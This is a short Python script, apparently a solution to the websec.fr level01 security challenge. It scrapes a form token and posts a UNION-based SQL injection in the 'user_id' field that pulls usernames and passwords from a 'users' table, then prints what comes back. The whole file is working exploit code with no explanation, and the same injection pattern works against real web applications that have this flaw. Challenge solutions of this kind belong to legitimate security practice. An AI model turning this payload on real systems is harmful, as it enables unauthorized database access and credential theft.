import requests

HOST = "http://websec.fr/level01/index.php"

sess = requests.Session()
res = sess.get(HOST)


start = res.text.find('value="', 850)
token = res.text[start+7:start+47]

command = "SELECT username, password from users where id=1"
payload = f"id and 1=2 union {command} --"
res = sess.post(HOST, {"submit": "abc", "user_id": payload, "token": token})

start = res.text.find("Other User Details")

details = res.text[start+36: start+2000]
details = details.split("<br />")[:-1]
details = [d.strip().replace("\t", "") for d in details]

for d in details:
    print(d)